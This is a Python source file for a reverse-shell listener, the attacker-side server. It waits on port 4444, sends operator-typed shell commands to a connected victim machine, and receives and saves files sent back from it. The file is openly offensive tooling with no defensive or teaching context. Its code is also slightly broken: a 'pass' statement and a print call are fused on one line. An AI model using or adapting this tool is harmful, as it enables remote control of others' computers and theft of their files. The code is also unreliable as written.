import socket as net
import json

LISTENER_IP = "0.0.0.0"
LISTENER_PORT = 4444

def start_server():
    server = net.socket(net.AF_INET, net.SOCK_STREAM)
    server.setsockopt(net.SOL_SOCKET, net.SO_REUSEADDR, 1)
    
    server.bind((LISTENER_IP, LISTENER_PORT))
    server.listen(5)
    
    print(f"[+] Listening for incoming connections on Port {LISTENER_PORT}...")
    
    client, addr = server.accept()
    print(f"[+] Connection established with {addr}")

    while True:
        try:
            cmd = input("\nShell> ").strip()
            if not cmd:
                continue
                
            client.send(cmd.encode())
            
            if cmd == "exit":
                print("[!] Closing connection.")
                break
            
            # Receive initial response
            response = client.recv(4096)
            
            # FILE TRANSFER
            try:
                response_str = response.decode('utf-8')
                
                if response_str.startswith("{") and '"action"' in response_str:
                    label = json.loads(response_str)
                    
                    if label.get("action") == "download":
                        filename = label["filename"]
                        filesize = label["filesize"]
                        
                        print(f"[*] Incoming file: {filename} ({filesize} bytes)")
       
                        client.send(b"OK")
                        
                        received_data = bytearray()
                        while len(received_data) < filesize:
                            chunk = client.recv(4096)
                            if not chunk: break
                            received_data.extend(chunk)
                            
                        save_name = "downloaded_" + os.path.basename(filename)
                        with open(save_name, "wb") as f:
                            f.write(received_data)
                            
                        print(f"[+] Successfully saved to {save_name}")
                        continue # Skip normal printing
            
            # If it's not JSON or not valid text, ignore the error and treat as normal output
            except (UnicodeDecodeError, json.JSONDecodeError):
                pass           print(response.decode(errors='ignore'))
            
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"\n[-] Connection Error: {e}")
            break
    client.close()
    server.close()

if __name__ == "__main__":
    import os 
    start_server()
    
